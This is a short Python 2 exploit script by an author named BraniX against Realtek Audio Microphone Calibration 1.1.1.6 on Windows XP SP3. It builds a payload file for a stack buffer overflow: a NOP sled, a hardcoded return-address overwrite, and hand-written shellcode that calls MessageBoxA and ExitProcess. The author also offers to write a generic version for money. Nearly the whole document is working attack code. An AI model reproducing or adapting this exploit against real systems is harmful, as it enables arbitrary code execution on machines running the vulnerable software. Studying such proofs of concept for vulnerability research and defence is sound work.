Realtek Audio Microphone Calibration 1.1.1.6 Exploit
====================================================

# done by BraniX <branix@hackers.org.pl>
# www.hackers.org.pl
# found: 2010.08.24
# tested on: Windows XP SP3 Home Edition
 
# App. has classic buffer overflow vulnerability
# it can be triggered by passing too long argument
# as a startup parameter. Shellcode can by run via classic
# ret overwrite or SEH Handler overwrite ... so it&#039;s a mini-combo ;)
 
# Ps. If you need generic exploit ...
# (no hardcoded VA&#039;a), write it yourself ;) or &#039;donate few&#039; $$$
# we will c0de it for You ^^
 
filepath = "C:\\ShellCode\\MicCal 1.1.1.6 - Exploit.bin"
f = open(filepath, "wb")
 
# dummy data
f.write(&#039;\x90&#039; * 340)
 
# overwrite ret
f.write(&#039;\xD7\x30\x9D\x7C&#039;)
f.write("[BraniX]")
f.write(&#039;A&#039; * 8)
 
# start shellcode
f.write(&#039;\x83\xEC\x08&#039;)         # sub esp,8
f.write(&#039;\x88\x04\x24&#039;)         # mov byte ptr [esp], al
f.write(&#039;\x83\xEC\x08&#039;)         # sub esp,8
 
f.write(&#039;\x54&#039;)                 # push esp
f.write(&#039;\x5B&#039;)                 # pop ebx
 
f.write(&#039;\x50&#039;)                 # push eax
f.write(&#039;\x53&#039;)                 # push ebx
f.write(&#039;\x53&#039;)                 # push ebx
f.write(&#039;\x50&#039;)                 # push eax
 
f.write(&#039;\xE8\x35\x08\x27\x7E&#039;) # call user32.MessageBoxA
f.write(&#039;\x57&#039;)                 # push edi
 
f.write(&#039;\xE8\x57\xCB\x6E\x7C&#039;) # call kernel32.ExitProcess
 
f.write(&#039;\xCC&#039; * 10)            # int 3&#039;s
 
f.close()
 
print "Done ..."



